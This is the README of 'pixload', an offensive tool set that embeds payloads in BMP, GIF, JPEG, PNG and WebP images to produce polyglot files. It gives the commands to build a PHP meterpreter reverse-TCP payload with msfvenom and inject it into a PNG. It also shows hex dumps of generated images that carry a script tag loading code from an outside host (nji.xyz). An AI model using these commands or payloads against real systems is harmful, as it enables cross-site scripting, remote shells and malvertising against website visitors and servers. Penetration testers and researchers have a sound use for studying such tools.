# pixload -- Image Payload Creating tools

## DESCRIPTION

Set of tools for ~~hiding backdoors~~ creating/injecting payload into images.

The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.

#### about

Useful references for better understanding of `pixload` and its use-cases:

- [Bypassing CSP using polyglot JPEGs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)

- [Hacking group using Polyglot images to hide malvertising attacks](https://devcondetect.com/blog/2019/2/24/hacking-group-using-polyglot-images-to-hide-malvertsing-attacks)

- [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

- [Revisiting XSS payloads in PNG IDAT chunks](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/)

If you want to encode a payload in such a way that the resulting binary blob is
both valid x86 shellcode and a valid image file, I recommend you to look
[here](https://warroom.securestate.com/bmp-x86-polyglot/) and
[here](https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/bmp_polyglot.rb).

#### msfvenom

If you want to inject a metasploit payload, you have to do something like this:

1. Create metasploit payload (i.e. php).
```sh
$ msfvenom -p php/meterpreter_reverse_tcp \
	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
```

2. Edit `payload.php` if needed.

3. Inject `payload.php` into the image (i.e. png).
```sh
./pixload-png -payload "$(cat payload.php)" -output payload.png
```

## SETUP

The following Perl modules are required:

  * GD

  * Image::ExifTool

  * String::CRC32

On `Debian-based` systems install these packages:

```sh
sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl
```

On `FreeBSD` and `DragonFlyBSD` install these packages:
```sh
doas pkg install p5-GD p5-Image-ExifTool p5-String-CRC32
```

On `OSX` please refer to [this workaround](https://github.com/chinarulezzz/pixload/issues/3)
(thnx 2 @iosdec).

#### Docker

```sh
docker build -t pixload .
docker run -v "$(pwd):/pixload" -it --rm pixload
```

## TOOLS

### bmp.pl

BMP Payload Creator/Injector.

Create a minimal BMP Polyglot Image with custom/default payload, or
inject payload into existing image.

##### Usage

```sh
./bmp.pl [-payload 'STRING'] -output payload.bmp

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
```

##### Example

```sh
./bmp.pl -output payload.bmp

[>|       BMP Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.bmp

[>] Injecting payload into payload.bmp
[✔] Payload was injected successfully

payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1

00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
00000030  2f 6e 6a 69 2e 78 79 7a  3e 3c 2f 73 63 72 69 70  |/nji.xyz></scrip|
00000040  74 3e 3b                                          |t>;|
00000043
```

### gif.pl

GIF Payload Creator/Injector.

Create a minimal GIF Polyglot Image with custom/default payload, or
inject payload into existing image.

##### Usage

```sh
./gif.pl [-payload 'STRING'] -output payload.gif

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be generated.
```
##### Example

```sh
./gif.pl -output payload.gif

[>|      GIF Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.gif

[>] Injecting payload into payload.gif
[✔] Payload was injected successfully

payload.gif: GIF image data, version 87a, 10799 x 32

00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|
00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|
00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
00000050  2f 2f 6e 6a 69 2e 78 79  7a 3e 3c 2f 73 63 72 69  |//nji.xyz></scri|
00000060  70 74 3e 3b                                       |pt>;|
00000064
```

### jpg.pl

JPG Payload Creator/Injector.

Create a minimal JPG Image with custom/default payload, or inject
payload into existing image.

There are two ways for injecting:

  - inject into COMMENT section

  - inject into DQT table

##### Usage

```sh
./jpg.pl -place COM|DQT [-payload 'STRING'] -output payload.jpg

-place COM:
  The payload will be injected as a 'COMMENT'.

  If the output file exists, then the payload will be injected into the
  existing file.  Else the new one will be created.

-place DQT:
  The payload will be injected into 'DQT table'.

  LIMITATION:
    1. payload size must not exceed 64 bytes.
    2. no injection support, only new file generation.

  This is necessary in case the server application processes images and
  removes comments, application-specific data, etc.

  The data in DQT table must remain intact.

  ! If the output file exists, then it will be rewritten. !
```

##### Example

* DQT

```sh
./jpg.pl -place DQT -output payload.jpg

[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into DQT table
[✔] Payload was injected succesfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
00000020  01 01 01 01 01 01 01 01  3c 73 63 72 69 70 74 20  |........<script |
00000030  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
00000070  00 00 00 01 3f ff d9                              |....?..|
00000077
```

* COMMENT

```sh
./jpg.pl -place COM -output payload.jpg

[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Injecting payload into COMMENT
[✔] Payload was injected successfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff fe 00 21 3c 73  63 72 69 70 74 20 73 72  |.....!<script sr|
00000010  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
00000020  72 69 70 74 3e ff db 00  43 00 01 01 01 01 01 01  |ript>...C.......|
00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
00000040  01 01 01 01 01 01 01 01  01 01 01 3c 73 63 72 69  |...........<scri|
00000050  70 74 20 73 72 63 3d 2f  2f 6e 6a 69 2e 78 79 7a  |pt src=//nji.xyz|
00000060  3e 3c 2f 73 63 72 69 70  74 3e ff c2 00 0b 08 00  |></script>......|
00000070  01 00 01 01 01 11 00 ff  c4 00 14 00 01 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 03 ff da 00  |................|
00000090  08 01 01 00 00 00 01 3f  ff d9                    |.......?..|
0000009a
```

### pixload-png

##### Help

```sh
$ pixload-png --help
```

```
Usage: pixload-png [OPTION]... FILE
Hide Payload/Malicious Code in PNG Images.

Mandatory arguments to long options are mandatory for short options too.
  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)
  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
  -P, --payload STRING        set payload for injection
  -v, --version               print version and exit
  -h, --help                  print help and exit

If the output FILE already exists, then payload will be injected into this
existing file. Else, the new one will be created with specified pixels wide.
```

##### Example

```sh
$ pixload-png payload.png
```

```
........ PNG Payload Creator/Injector .........
...............................................
... https://github.com/chinarulezzz/pixload ...
...............................................

[>] Generating output file
[✔] File saved to: payload.png

[>] Injecting payload into payload.png

[+] Chunk size: 13
[+] Chunk type: IHDR
[+] CRC: fc18eda3
[+] Chunk size: 9
[+] Chunk type: pHYs
[+] CRC: 952b0e1b
[+] Chunk size: 25
[+] Chunk type: IDAT
[+] CRC: c8a288fe
[+] Chunk size: 0
[+] Chunk type: IEND

[>] Inject payload to the new chunk: 'pUnk'
[✔] Payload was injected successfully

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|
00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|
00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|
00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK<script sr|
000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |</script>.....IE|
000000f0  4e 44                                             |ND|
000000f2
```

See [pixload-png(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod)
manual page for more information.

### webp.pl

WebP Payload Creator/Injector.

Create a WebP Polyglot Image with custom/default payload, or inject
payload into existing image.

##### Usage

```sh
./webp.pl [-payload 'STRING'] -output payload.webp

Currently, there is no possibility to inject the payload into an existing
webp image.  Only the new (minimal) webp image will be created and your
payload will be injected into.

If the -output argument file exists, the payload will be injected into 
the existing image, but this image will be corrupted.
```

##### Example

```sh
[>|      WebP Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.webp

[>] Injecting payload into payload.webp
[✔] Payload was injected successfully

payload.webp: RIFF (little-endian) data, Web/P image

00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|
00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|
00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;<script s|
00000030  72 63 3d 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |rc=//nji.xyz></s|
00000040  63 72 69 70 74 3e 3b                              |cript>;|
00000047
```

## LICENSE

WTFPL

## LEGAL DISCLAIMER

The author does not hold any responsibility for the bad use
of this tool, remember that attacking targets without prior
consent is illegal and punished by law.

## DONATIONS

- BTC: `bc1qj4g98svq6qh3q2ap37v52nsvusa76c3cnmcdmx`

- PAYPAL: `alexandr.savca89@gmail.com`

Highly appreciated.
